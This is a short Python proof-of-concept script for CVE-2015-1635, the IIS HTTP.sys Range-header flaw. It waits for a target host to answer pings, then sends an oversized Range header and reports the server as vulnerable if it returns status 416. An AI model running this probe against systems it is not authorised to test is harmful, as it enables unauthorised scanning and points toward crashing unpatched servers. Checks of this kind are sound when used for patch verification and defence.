#!/usr/bin/env python3
# CVE-2015-1635 PoC

import requests
import subprocess, time
import sys

def is_target_up(ip: str) -> bool:
    return subprocess.run(["ping", "-n", "1", ip], capture_output=True).returncode == 0 # Cheeky: A nonzero status code means the target wasn't up

def wait_for_target_up(ip: str) -> None:
    # Wait for target to go up by continually pinging it
    print("Waiting for target to go up.", end="")
    wait_start = time.time()
    while not is_target_up(ip):
        print(".", end="")
    wait_end = time.time()
    print(" Target up! Took", wait_end-wait_start, "seconds of waiting.")

if __name__ == "__main__":
    ip = sys.argv[1]
    url = "http://" + ip + "/"
    wait_for_target_up(ip)
    kv = { "Range" : "bytes=0-18446744073709551615" }
    try:
        response = requests.get(url, headers = kv, timeout = 30)
        if response.status_code == 416:
            print("\033[31m[!] Find Vulnerabilities!\033[0m")
        else:
            print("\033[32m[!] Safe\033[0m")
    except:
        print("\033[33m[!] HTTP Error!\033[0m")